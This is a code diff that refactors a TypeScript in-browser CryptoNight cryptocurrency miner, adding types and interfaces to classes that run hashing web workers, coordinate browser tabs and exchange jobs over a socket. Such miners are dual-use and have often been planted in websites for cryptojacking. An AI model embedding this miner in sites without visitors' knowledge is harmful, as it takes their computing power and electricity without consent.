@@ -1,18 +1,33 @@
 import { EventEmitter } from 'events';
-import { STATIC_DIRECTORY } from '../credentials.json';
+const {STATIC_DIRECTORY} = require('../credentials.json');
 
 const IF_EXCLUSIVE_TAB = 'ifExclusiveTab';
 const FORCE_EXCLUSIVE_TAB = 'forceExclusiveTab';
 const FORCE_MULTI_TAB = 'forceMultiTab';
 
+interface Job {
+  blob: string;
+  job_id: string;
+  target: string;
+  throttle: number;
+}
+
+interface MinerParameters {
+  socket: SocketIOClient.Socket;
+  throttle?: number;
+  threads?: number;
+  autoThreads?: boolean;
+  forceASMJS?: boolean;
+}
+
 export default class Miner extends EventEmitter {
-  private socket: any;
+  private socket: SocketIOClient.Socket;
   private siteKey: string;
   private user: any;
   private threads: Array<JobThread>;
   private verifyThread: JobThread;
   private hashes: number;
-  private currentJob: any;
+  private currentJob: Job;
   private tokenFromServer?: string;
   private goal: number;
   private totalHashesFromDeadThreads: number;
@@ -20,7 +35,6 @@ export default class Miner extends EventEmitter {
   private autoThreads: any;
   private tab: any;
   private bc: BroadcastChannel;
-  private eventListeners: any;
   private targetNumThreads: number;
   private useWASM: boolean;
 
@@ -28,13 +42,8 @@ export default class Miner extends EventEmitter {
     super();
   }
 
-  initialize(siteKey, params) {
-    params = params || {};
+  initialize(siteKey: string, params: MinerParameters) {
     this.socket = params.socket;
-    this.socket.on('miner-message', this.onMessage.bind(this));
-    this.socket.on('error', this.onError.bind(this));
-    this.socket.on('disconnect', this.onClose.bind(this));
-    this.socket.on('connect', this.onOpen.bind(this));
     this.siteKey = siteKey;
     this.user = null;
     this.threads = [];
@@ -59,6 +68,18 @@ export default class Miner extends EventEmitter {
       lastPingReceived: 0,
       interval: null
     };
+
+    this.targetNumThreads = Math.max((params.threads || this.hardwareConcurrency) - 1, 1);
+    this.useWASM = this.hasWASMSupport() && !params.forceASMJS;
+
+    this.onTargetMet = this.onTargetMet.bind(this);
+    this.onVerified = this.onVerified.bind(this);
+
+    this.socket.on('miner-message', this.onMessage.bind(this));
+    this.socket.on('error', this.onError.bind(this));
+    this.socket.on('disconnect', this.onClose.bind(this));
+    this.socket.on('connect', this.onOpen.bind(this));
+
     if (BroadcastChannel) {
       try {
         this.bc = new BroadcastChannel('cryptonight-miner');
@@ -69,14 +90,13 @@ export default class Miner extends EventEmitter {
         });
       } catch (e) {}
     }
-    const defaultThreads = navigator.hardwareConcurrency || 4;
-    this.targetNumThreads = Math.max((params.threads || defaultThreads) - 1, 1);
-    this.useWASM = this.hasWASMSupport() && !params.forceASMJS;
-    this.onTargetMet = this.onTargetMet.bind(this);
-    this.onVerified = this.onVerified.bind(this);
   }
 
-  public start(mode = '') {
+  public get hardwareConcurrency() {
+    return navigator.hardwareConcurrency || 4
+  }
+
+  public start(mode: string = '') {
     this.tab.mode = mode || IF_EXCLUSIVE_TAB;
     if (this.tab.interval) {
       clearInterval(this.tab.interval);
@@ -85,7 +105,7 @@ export default class Miner extends EventEmitter {
     this.startNow();
   }
 
-  public stop(mode = '') {
+  public stop(mode: string = '') {
     for (let i = 0; i < this.threads.length; i++) {
       this.totalHashesFromDeadThreads += this.threads[i].hashesTotal;
       this.threads[i].stop();
@@ -102,7 +122,7 @@ export default class Miner extends EventEmitter {
     }
   }
 
-  public getHashesPerSecond() {
+  public getHashesPerSecond(): number {
     let hashesPerSecond = 0;
     for (let i = 0; i < this.threads.length; i++) {
       hashesPerSecond += this.threads[i].hashesPerSecond;
@@ -110,7 +130,7 @@ export default class Miner extends EventEmitter {
     return Math.round(hashesPerSecond);
   }
 
-  public getTotalHashes(estimate) {
+  public getTotalHashes(estimate): number {
     const now = Date.now();
     let hashes = this.totalHashesFromDeadThreads;
     for (let i = 0; i < this.threads.length; i++) {
@@ -124,20 +144,20 @@ export default class Miner extends EventEmitter {
     return hashes | 0;
   }
 
-  public getAcceptedHashes() {
+  public getAcceptedHashes(): number {
     return this.hashes;
   }
 
-  public getToken() {
+  public getToken(): string {
     return this.tokenFromServer;
   }
 
-  public getAutoThreadsEnabled(enabled) {
+  public getAutoThreadsEnabled(): boolean {
     return this.autoThreads.enabled;
   }
 
-  public setAutoThreadsEnabled(enabled) {
-    this.autoThreads.enabled = Boolean(enabled);
+  public setAutoThreadsEnabled(enabled: boolean): void {
+    this.autoThreads.enabled = enabled;
     if (!enabled && this.autoThreads.interval) {
       clearInterval(this.autoThreads.interval);
       this.autoThreads.interval = null;
@@ -148,26 +168,26 @@ export default class Miner extends EventEmitter {
     }
   }
 
-  public getThrottle() {
+  public getThrottle(): number {
     return this.throttle;
   }
 
-  public setThrottle(throttle) {
+  public setThrottle(throttle: number): void {
     this.throttle = Math.max(0, Math.min(0.99, throttle));
     if (this.currentJob) {
       this.setJob(this.currentJob);
     }
   }
 
-  public getWorkerName() {
+  public getWorkerName(): string {
     return this.useWASM ? 'cryptonight.wasm.js' : 'cryptonight.asm.js';
   }
 
-  public getNumThreads() {
+  public getNumThreads(): number {
     return this.targetNumThreads;
   }
 
-  public setNumThreads(num: number) {
+  public setNumThreads(num: number): void {
     num = Math.max(1, num | 0);
     this.targetNumThreads = num;
     if (num > this.threads.length) {
@@ -187,19 +207,19 @@ export default class Miner extends EventEmitter {
     }
   }
 
-  public isMobile() {
+  public isMobile(): boolean {
     return /mobile|Android|webOS|iPhone|iPad|iPod|IEMobile|Opera Mini/i.test(navigator.userAgent);
   }
 
-  public hasWASMSupport() {
+  public hasWASMSupport(): boolean {
     return window.WebAssembly !== undefined;
   }
 
-  public isRunning() {
+  public get isRunning(): boolean {
     return this.threads.length > 0;
   }
 
-  private startNow() {
+  private startNow(): void {
     if (this.tab.mode !== FORCE_MULTI_TAB && !this.tab.interval) {
       this.tab.interval = setInterval(this.updateTabs.bind(this), 1e3);
     }
@@ -233,12 +253,12 @@ export default class Miner extends EventEmitter {
 
   private updateTabs() {
     const otherTabRunning = this.otherTabRunning();
-    if (otherTabRunning && this.isRunning() && Date.now() > this.tab.grace) {
+    if (otherTabRunning && this.isRunning && Date.now() > this.tab.grace) {
       this.stop('dontKillTabUpdate');
-    } else if (!otherTabRunning && !this.isRunning()) {
+    } else if (!otherTabRunning && !this.isRunning) {
       this.startNow();
     }
-    if (this.isRunning()) {
+    if (this.isRunning) {
       if (this.bc) {
         this.bc.postMessage('ping');
       }
@@ -333,9 +353,7 @@ export default class Miner extends EventEmitter {
       this.hashes = msg.params.hashes || 0;
       this.emit('authed', msg.params);
     } else if (msg.type === 'error') {
-      if (console && console.error) {
-        console.error('cryptonight-miner Error:', msg.params.error);
-      }
+      console.error('cryptonight-miner Error:', msg.params.error);
       this.emit('error', msg.params);
     } else if (msg.type === 'banned' || msg.params.banned) {
       this.emit('error', {
@@ -344,7 +362,7 @@ export default class Miner extends EventEmitter {
     }
   }
 
-  private setJob(job) {
+  private setJob(job: Job) {
     this.currentJob = job;
     this.currentJob.throttle = this.throttle;
     for (let i = 0; i < this.threads.length; i++) {
@@ -367,10 +385,10 @@ export default class Miner extends EventEmitter {
     this.send('verified', verifyResult);
   }
 
-  private send(type, params) {
+  private send(type: string, params: object = {}) {
     const msg = {
       type,
-      params: params || {}
+      params
     };
     console.log('miner', msg);
     this.socket.emit('miner-message', msg);
@@ -379,7 +397,7 @@ export default class Miner extends EventEmitter {
 
 class JobThread {
   private worker: Worker;
-  private currentJob: Object;
+  private currentJob: Job;
   private jobCallback: Function;
   private verifyCallback: Function;
   private isReady: boolean;
@@ -388,7 +406,7 @@ class JobThread {
   private running: boolean;
   public lastMessageTimestamp: number;
 
-  constructor(workerName) {
+  constructor(workerName: string) {
     switch (workerName) {
       case 'cryptonight.wasm.js':
         this.worker = new Worker(STATIC_DIRECTORY + '/cryptonight.wasm.js');
@@ -436,7 +454,7 @@ class JobThread {
     }
   }
 
-  public setJob(job, callback) {
+  public setJob(job: Job, callback) {
     this.currentJob = job;
     this.jobCallback = callback;
     if (this.isReady && !this.running) {
